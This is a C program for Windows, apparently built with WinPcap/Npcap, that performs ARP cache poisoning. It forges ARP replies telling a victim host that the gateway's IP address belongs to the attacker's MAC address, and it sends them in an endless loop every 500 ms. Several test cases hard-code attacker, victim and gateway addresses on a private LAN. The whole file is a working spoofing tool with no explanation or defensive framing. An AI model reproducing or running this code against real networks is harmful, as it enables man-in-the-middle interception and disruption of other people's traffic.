#include <WinSock2.h>
#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sal.h>

#pragma warning(disable:4996)
#pragma warning(disable:6011)
#pragma warning(disable:6328)

#define ETH_LEN			6
#define IP_LEN			4

#define ETHERTYPE_ARP	0x0806

#define _TEST_CASE_3

/* [T/F] [String MAC Address to 8Bit Array] [_src(String), _dst(8Bit Array)] */
bool set_host(_In_ const char* _src, _Inout_ uint8_t* _dst);

/* [void] [String IP Address to 8Bit Array] [_src(String), _dst(8Bit Array)] */
void set_ip(_In_ const char* _src, _Inout_ uint8_t* _dst);

/* [Handle] [Get Network Interface Handle] [void] */
pcap_t* get_pcap_handle();

/* [void] [Make ARP Reply Packet] [_packet(Out Pcaket), _length(Total Length)] */
void make_arp_reply(_Inout_ uint8_t* _packet, _Inout_ int* _length);

typedef struct _pcap_info
{
	const char* a_host;		// Attacker MAC Address
	const char* a_ip;		// Attacker IP Address
	const char* v_host;		// Victim MAC Address
	const char* v_ip;		// Attacker IP Address
	const char* g_host;		// Gateway MAC Address
	const char* g_ip;		// Gateway IP Address
} pcap_info, *ppcap_info;

#pragma pack(push, 1)
struct ether_header
{
	uint8_t		dst_host[ETH_LEN];		// (8Bit x 6)	Destination MAC Address
	uint8_t		src_host[ETH_LEN];		// (8Bit x 6)	Source MAC Address
	uint16_t	ether_type;				// (16Bit)		Ethernet Type
};
#pragma pack(pop)

#pragma pack(push, 1)
struct arp_header
{
	uint16_t	hw_type;				// (16Bit)		Hardware Type
	uint16_t	protocol_type;			// (16Bit)		Protocol Type
	uint8_t		hw_size;				// (8Bit)		Hardware Size
	uint8_t		protocol_size;			// (8Bit)		Protocol Size
	uint16_t	opcode;					// (16Bit)		Opcode[1-4]
	uint8_t		sender_host[ETH_LEN];	// (8Bit x 6)	Sender MAC Address
	uint8_t		sender_ip[IP_LEN];		// (8Bit x 4)	Sender IP Address
	uint8_t		target_host[ETH_LEN];	// (8Bit x 6)	Target MAC Address
	uint8_t		target_ip[IP_LEN];		// (8Bit x 4)	Target IP Address
};
#pragma pack(pop)

pcap_info _info;

int main(void)
{
#ifdef _TEST_CASE_1
	_info.a_host = "00:00:00:00:00:00";
	_info.a_ip = "0.0.0.0";
	_info.v_host = "00:00:00:00:00:00";
	_info.v_ip = "0.0.0.0";
	_info.g_host = "00:00:00:00:00:00";
	_info.g_ip = "0.0.0.0";
#endif

#ifdef _TEST_CASE_2
	_info.a_host = "a8:5e:45:55:1e:8a";
	_info.a_ip = "192.168.42.2";
	_info.v_host = "5c:51:4f:d8:02:8e";
	_info.v_ip = "192.168.42.13";
	_info.g_host = "";
	_info.g_ip = "192.168.42.1";
#endif

#ifdef _TEST_CASE_3
	_info.a_host = "a8:5e:45:55:1e:8a";
	_info.a_ip = "192.168.42.2";
	_info.v_host = "18:67:b0:ca:b4:b1";
	_info.v_ip = "192.168.42.30";
	_info.g_host = "";
	_info.g_ip = "192.168.42.1";
#endif

#ifdef _TEST_CASE_4
	_info.a_host = "a8:5e:45:55:1e:8a";
	_info.a_ip = "192.168.42.2";
	_info.v_host = "b0:6e:bf:c6:fa:45";
	_info.v_ip = "192.168.42.4";
	_info.g_host = "88:36:6c:7a:56:40";
	_info.g_ip = "192.168.42.1";
#endif

	pcap_t* dev_handle = get_pcap_handle();
	if (dev_handle == NULL)
	{
		printf("[ERROR] get_pcap_handle()\n");
		exit(1);
	}

	uint8_t arp_packet[100] = { 0 };
	int arp_packet_len = 0;
	make_arp_reply(arp_packet, &arp_packet_len);

	while(true)
	{
		pcap_sendpacket(dev_handle, arp_packet, arp_packet_len);
		Sleep(500);
	}
	
	return 0;
}

bool set_host(_In_ const char* _src, _Inout_ uint8_t* _dst)
{
	if (sscanf(_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &_dst[0], &_dst[1], &_dst[2], &_dst[3], &_dst[4], &_dst[5]) < ETH_LEN)
		return false;
	return true;
}

void set_ip(_In_ const char* _src, _Inout_ uint8_t* _dst)
{
	uint32_t temp = htonl(inet_addr(_src));
	for (int i = 0; i < IP_LEN; i++)
		_dst[i] = ((uint8_t*)&temp)[3 - i];
}

pcap_t* get_pcap_handle()
{
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_if_t* allDev;
	if (pcap_findalldevs(&allDev, errbuf) == PCAP_ERROR)
	{
		printf("[ERROR] pcap_findalldevs() : %s\n", errbuf);
		return NULL;
	}

	pcap_if_t* tempDev;
	int i = 0;
	for (tempDev = allDev; tempDev != NULL; tempDev = tempDev->next)
	{
		printf("%d. %s", ++i, tempDev->name);
		if (tempDev->description)
			printf("  (%s)\n", tempDev->description);
		else printf("\n");
	}

	int select;
	printf("select interface number (1-%d) : ", i);
	scanf_s("%d", &select);
	for (tempDev = allDev, i = 0; i < select - 1; tempDev = tempDev->next, i++);

	pcap_t* _handle = pcap_open(tempDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);
	if (_handle == NULL)
	{
		printf("[ERROR] pcap_open() : %s\n", errbuf);
		return NULL;
	}
	pcap_freealldevs(allDev);
	return _handle;
}

void make_arp_reply(_Inout_ uint8_t* _packet, _Inout_ int* _length)
{
	struct ether_header eth;
	set_host(_info.v_host, eth.dst_host);
	set_host(_info.a_host, eth.src_host);
	eth.ether_type = htons(ETHERTYPE_ARP);

	struct arp_header arp;
	arp.hw_type = htons(0x0001);
	arp.protocol_type = htons(0x0800);
	arp.hw_size = 0x06;
	arp.protocol_size = 0x04;
	arp.opcode = htons(0x0002);
	set_host(_info.a_host, arp.sender_host);
	set_ip(_info.g_ip, arp.sender_ip);
	set_host(_info.v_host, arp.target_host);
	set_ip(_info.v_ip, arp.target_ip);

	memcpy(_packet, &eth, sizeof(eth));
	*_length += sizeof(eth);

	memcpy(_packet + *_length, &arp, sizeof(arp));
	*_length += sizeof(arp);
}